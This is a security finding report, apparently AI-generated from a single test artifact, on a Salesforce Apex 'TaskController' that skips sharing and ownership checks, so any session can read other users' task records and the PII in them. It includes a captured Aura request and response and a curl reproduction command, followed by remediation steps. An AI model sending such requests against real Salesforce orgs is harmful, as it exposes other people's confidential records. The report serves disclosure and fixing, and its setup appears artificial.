# Security Analysis Report
**System:** GrantFlow CRM API (Non-Profit / Grant Management) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0027 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | Platform / Pattern 9.2 | Salesforce SOQL record-level access bypass — `TaskController.getTask` without ownership check exposes cross-user grant management task records |

---

## Finding 1 — SOQL Record-Level Access Bypass in Grant Management Platform (CRITICAL)

### Summary
The `TaskController` Apex class on GrantFlow CRM API (`83c5f6d4.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private for Task records. Per §5.0 Pattern 9.2, the `getTask` Aura action issues a SOQL query using only `WHERE Id = :taskId` — with no ownership predicate. An attacker with a valid Salesforce session supplies `taskId: "001F6D4"` to retrieve a victim's grant management task, including SSN and confidential grant review notes. This is a direct Salesforce platform-level record access bypass.

**Pattern:** 9.2 — SOQL and Salesforce record-level access (Platform)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://83c5f6d4.lightning.force.com/aura`

### Evidence from HAR
**Request:**
```
POST https://83c5f6d4.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D83C5F6D4!AR83c5f6d4...
message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","params":{"taskId":"001F6D4","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{"actions":[{"id":"1;a","state":"SUCCESS","returnValue":{"records":[{"Id":"001F6D4","Name":"Victim Task Record","OwnerId":"005VICTIM","InternalNotes__c":"CONFIDENTIAL: internal review notes","SensitiveData__c":"SSN: 000-21-9631"}]},"error":[]}]}
```

### Evidence Map
| Artifact | Field | Value | Significance |
|---|---|---|---|
| §4.0 Apex | `without sharing` | Class declaration | OWD bypassed |
| §4.0 SOQL | `WHERE Id = :taskId` | No OwnerId check | SOQL record-level bypass |
| §5.0 Pattern 9.2 | Vulnerability | SOQL record-level access bypass | Platform classification |
| HAR descriptor | `c.TaskController.getTask` | Aura action | Entry point |
| HAR params | `taskId` | `001F6D4` | Victim record |
| HAR response | `OwnerId` | `005VICTIM` | Cross-user confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-21-9631` | Grant management PII |

### Steps to Reproduce
```bash
SF_TOKEN="00D83C5F6D4!AR83c5f6d4..."
curl -s -X POST "https://83c5f6d4.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001F6D4","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# VULNERABLE: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-21-9631
```

### Remediation
1. `public with sharing class TaskController {`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Remove client `fields` parameter; define server-side allowlist.
4. Validate `aura.token` server-side.
5. Non-profit/grant management: beneficiary PII, donor data, grant review notes — cross-user access exposes regulated PII and grant integrity risks.
